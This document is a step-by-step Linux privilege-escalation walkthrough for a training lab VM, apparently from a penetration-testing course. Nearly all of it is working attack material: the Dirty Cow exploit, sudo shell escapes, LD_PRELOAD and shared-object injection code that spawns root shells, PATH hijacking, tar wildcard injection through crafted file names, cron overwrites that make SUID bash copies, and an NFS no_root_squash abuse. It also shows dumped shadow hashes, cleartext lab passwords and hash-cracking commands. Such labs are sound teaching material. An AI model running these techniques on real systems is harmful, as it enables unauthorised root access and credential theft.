# Linux PrivEsc 

##  Privilege Escalation - Kernel Exploits 

### Dirty Cow Exploitation

Detection

Linux VM

1. In terminal type:
/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
2. From the output, notice that the OS is vulnerable to “dirtycow”.

Exploitation

Linux VM

1. In Terminal type:
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
2. In command prompt type: ./c0w

Disclaimer: This part takes 1-2 minutes - Please allow it some time to work.

3. In command prompt type: passwd
4. In command prompt type: id

From here, either copy /tmp/passwd back to /usr/bin/passwd or reset your machine to undo changes made to the passwd binary.

## Privilege Escalation - Stored Passwords (Config Files) 

Exploitation

Linux VM

1. In terminal type: cat /home/user/myvpn.ovpn
2. From the output, make note of the value of the “auth-user-pass” directive.
3. In terminal type: cat /etc/openvpn/auth.txt
4. From the output, make note of the clear-text credentials.
5. In terminal type: cat /home/user/.irssi/config | grep -i passw
6. From the output, make note of the clear-text credentials.

`` 
TCM@debian:~$ cat /home/user/myvpn.ovpn 
``
``
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0
``
``
TCM@debian:~$ cat /etc/openvpn/auth.txt
user
password321
TCM@debian:~$ cat /home/user/.irssi/config | grep -i passw
    autosendcmd = "/msg nickserv identify password321 ;wait 2000";
``

## Privilege Escalation - Stored Passwords (History)

Exploitation

Linux VM
1. In command prompt type: cat ~/.bash_history | grep -i passw
2. From the output, make note of the clear-text credentials.

`` 
TCM@debian:~$ cat /home/user/.irssi/config | grep -i passw
    autosendcmd = "/msg nickserv identify password321 ;wait 2000";
TCM@debian:~$ cat ~/.bash_history | grep -i passw
mysql -h somehost.local -uroot -ppassword123
cat /etc/passwd | cut -d: -f1
awk -F: '($3 == "0") {print}' /etc/passwd
``

## Privilege Escalation - Weak File Permissions 

Detection

Linux VM

1. In command prompt type:
ls -la /etc/shadow
2. Note the file permissions

`TCM@debian:~$ ls -al /etc/shadow
-rw-rw-r-- 1 root shadow 809 Jun 17 23:33 /etc/shadow`

Exploitation

Linux VM

1. In command prompt type: cat /etc/passwd

`TCM@debian:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
statd:x:103:65534::/var/lib/nfs:/bin/false
TCM:x:1000:1000:user,,,:/home/user:/bin/bash
`
2. Save the output to a file on your attacker machine
3. In command prompt type: cat /etc/shadow
`
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:18431:0:99999:7:::
`

4. Save the output to a file on your attacker machine

Attacker VM

1. In command prompt type: unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt

Now, you have an unshadowed file.  We already know the password, but you can use your favorite hash cracking tool to crack dem hashes.  For example:

hashcat -m 1800 unshadowed.txt rockyou.txt -O

## Privilege Escalation - SSH Keys 

Detection

Linux VM

1. In command prompt type:
find / -name authorized_keys 2> /dev/null
2. In a command prompt type:
find / -name id_rsa 2> /dev/null
3. Note the results.

Exploitation

Linux VM

1. Copy the contents of the discovered id_rsa file to a file on your attacker VM.

Attacker VM

1. In command prompt type: chmod 400 id_rsa
2. In command prompt type: ssh -i id_rsa root@<ip>

##  Privilege Escalation - Sudo (Shell Escaping)

Detection﻿

Linux VM

1. In command prompt type: sudo -l
2. From the output, notice the list of programs that can run via sudo.

Exploitation

Linux VM

1. In command prompt type any of the following:
a. sudo find /bin -name nano -exec /bin/sh \;
b. sudo awk 'BEGIN {system("/bin/sh")}'
c. echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
d. sudo vim -c '!sh'

##  Privilege Escalation - Sudo (Abusing Intended Functionality) 

Detection

Linux VM

1. In command prompt type: sudo -l
2. From the output, notice the list of programs that can run via sudo.

Exploitation

Linux VM

1. In command prompt type:
sudo apache2 -f /etc/shadow
2. From the output, copy the root hash.

Attacker VM

1. Open command prompt and type:
echo '[Pasted Root Hash]' > hash.txt
2. In command prompt type:
john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
3. From the output, notice the cracked credentials.

## Privilege Escalation - Sudo (LD_PRELOAD) 

Detection

Linux VM

1. In command prompt type: sudo -l
2. From the output, notice that the LD_PRELOAD environment variable is intact.

Exploitation

1. Open a text editor and type:
`
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
`
`
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}`

2. Save the file as x.c
3. In command prompt type:
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
4. In command prompt type:
sudo LD_PRELOAD=/tmp/x.so apache2
5. In command prompt type: id

## Privilege Escalation - SUID (Shared Object Injection) 

Detection

Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command line type:
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
4. From the output, notice that a .so file is missing from a writable directory.

Exploitation

Linux VM

5. In command prompt type: mkdir /home/user/.config
6. In command prompt type: cd /home/user/.config
7. Open a text editor and type:

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

8. Save the file as libcalc.c
9. In command prompt type:
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
10. In command prompt type: /usr/local/bin/suid-so
11. In command prompt type: id

## Privilege Escalation - SUID (Symlinks)

Detection

Linux VM

1. In command prompt type: dpkg -l | grep nginx
2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.

Exploitation

Linux VM – Terminal 1

1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: su root
2. The root password is password123
3. Once escalated to root, in command prompt type: su -l www-data
4. In command prompt type: /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

Linux VM – Terminal 2

1. Once logged in, type: su root
2. The root password is password123
3. As root, type the following: invoke-rc.d nginx rotate >/dev/null 2>&1
4. Switch back to the previous terminal.

Linux VM – Terminal 1

1. From the output, notice that the exploit continued its execution.
2. In command prompt type: id

##  Privilege Escalation - SUID (Environment Variables #1)

Detection

Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command prompt type: strings /usr/local/bin/suid-env
4. From the output, notice the functions used by the binary.

Exploitation

Linux VM

1. In command prompt type:
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
2. In command prompt type: gcc /tmp/service.c -o /tmp/service
3. In command prompt type: export PATH=/tmp:$PATH
4. In command prompt type: /usr/local/bin/suid-env
5. In command prompt type: id

## Privilege Escalation - SUID (Environment Variables #2)

Detection

Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command prompt type: strings /usr/local/bin/suid-env2
4. From the output, notice the functions used by the binary.

Exploitation Method #1

Linux VM

1. In command prompt type:
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
2. In command prompt type:
export -f /usr/sbin/service
3. In command prompt type: /usr/local/bin/suid-env2

Exploitation Method #2

Linux VM

1. In command prompt type:
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'

##  Privilege Escalation - Capabilities 

Detection

Linux VM

1. In command prompt type: getcap -r / 2>/dev/null
2. From the output, notice the value of the “cap_setuid” capability.

Exploitation

Linux VM

1. In command prompt type:
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
2. Enjoy root!

##  Privilege Escalation - Cron (Path) 

Detection

Linux VM

1. In command prompt type: cat /etc/crontab
2. From the output, notice the value of the “PATH” variable.

Exploitation

Linux VM

1. In command prompt type:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
2. In command prompt type: chmod +x /home/user/overwrite.sh
3. Wait 1 minute for the Bash script to execute.
4. In command prompt type: /tmp/bash -p
5. In command prompt type: id

##  Privilege Escalation - Cron (Wildcards)

Detection

Linux VM

1. In command prompt type: cat /etc/crontab
2. From the output, notice the script “/usr/local/bin/compress.sh”
3. In command prompt type: cat /usr/local/bin/compress.sh
4. `From the output, notice the wildcard (*) used by ‘tar’.`

Exploitation

Linux VM

1. In command prompt type:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
2. touch /home/user/--checkpoint=1
3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh
4. Wait 1 minute for the Bash script to execute.
5. In command prompt type: /tmp/bash -p
6. In command prompt type: id

## Privilege Escalation - Cron (File Overwrite)

Detection

Linux VM

1. In command prompt type: cat /etc/crontab
2. From the output, notice the script “overwrite.sh”
3. In command prompt type: ls -l /usr/local/bin/overwrite.sh
4. From the output, notice the file permissions.

Exploitation

Linux VM

1. In command prompt type:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
2. Wait 1 minute for the Bash script to execute.
3. In command prompt type: /tmp/bash -p
4. In command prompt type: id

##  Privilege Escalation - NFS Root Squashing 

Detection

Linux VM

1. In command line type: cat /etc/exports
2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.

Exploitation

Attacker VM

1. Open command prompt and type: showmount -e 10.10.66.122
2. In command prompt type: mkdir /tmp/1
3. In command prompt type: mount -o rw,vers=2 10.10.66.122:/tmp /tmp/1
In command prompt type:
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
4. In command prompt type: gcc /tmp/1/x.c -o /tmp/1/x
5. In command prompt type: chmod +s /tmp/1/x

Linux VM

1. In command prompt type: /tmp/x
2. In command prompt type: id
